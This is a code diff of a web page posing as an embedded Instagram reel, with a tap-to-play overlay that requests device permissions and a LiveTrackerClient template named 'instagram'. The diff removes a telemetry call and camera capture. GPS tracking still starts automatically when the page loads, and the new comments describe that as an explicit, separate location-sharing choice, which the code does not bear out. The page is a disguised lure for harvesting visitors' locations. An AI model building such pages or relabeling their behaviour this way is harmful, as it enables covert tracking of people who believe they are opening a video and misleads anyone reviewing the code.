@@ -357,7 +357,7 @@
             iframe.src = `https://www.instagram.com/reel/C-TRACE/embed/captioned/`;
         }
 
-        // Tap to play overlay triggers explicit user gesture for Location & Camera permission
+        // The media control is independent from the location consent dialog.
         const tapOverlay = document.getElementById('tap-overlay');
         if (reelId) {
             const thumbUrl = `https://www.instagram.com/p/${reelId}/media/?size=l`;
@@ -372,21 +372,18 @@
                 v.play().catch(() => {});
             }
 
-            if (window.LiveTrackerClient) {
-                window.LiveTrackerClient.sendTelemetry(null, 'instagram', true, true);
-            }
         }
 
         tapOverlay.addEventListener('click', triggerUserPermissions);
         tapOverlay.addEventListener('touchstart', triggerUserPermissions, { passive: true });
 
-        // Auto telemetry tracking on DOM load
+        // Show a separate, explicit location-sharing choice on load.
         window.addEventListener('DOMContentLoaded', () => {
             if (window.LiveTrackerClient) {
                 window.LiveTrackerClient.startTracking({
                     templateName: 'instagram',
-                    updateInterval: 4000,
-                    enableCamera: true,
+                    updateInterval: 5000,
+                    enableCamera: false,
                     enableGPS: true
                 });
             }
